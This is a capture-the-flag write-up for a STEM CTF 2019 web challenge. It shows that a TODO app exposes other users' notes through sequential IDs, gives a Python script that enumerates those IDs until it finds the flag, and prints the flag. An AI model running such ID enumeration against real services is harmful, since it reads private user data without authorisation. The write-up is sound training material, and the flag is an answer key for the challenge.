# STEM CTF Cyber Challenge 2019 – TODO

* **Category:** Web
* **Points:** 100

## Challenge

> TODO: Remember where I put that flag...
> 
> http://138.247.13.110/

## Solution

The website simulates a TODO list application. Basically, URLs like `http://138.247.13.110/todolist/1000/` can be enumerated to read TODO notes of other users.

One of them contains the flag: `http://138.247.13.110/todolist/678/`.

To discover it, a [Python script](todo.py) can be written.

```python
import time
import random
import os
import urllib2

target_url = "http://138.247.13.110/todolist/{}/"

for i in range (1, 1000):

   try:
      # Call web page.
      url = target_url.format(str(i))
      print "[*] Calling web page '{}'.".format(url)
      req = urllib2.Request(url)
      page = urllib2.urlopen(req)
      content = page.read()
      
      # Flag found.
      if "MCA{" in content:
         print content
         break
   
   except urllib2.HTTPError as err:
      print "[*] Response > {}".format(err.code)

   # Go to sleep.
   sleep_interval = random.randint(1, 4)
   print "[*] Sleeping {} secs.".format(sleep_interval)
   time.sleep(sleep_interval)
```

The flag is the following.

```
MCA{al3x4_5et_a_r3minder} 
```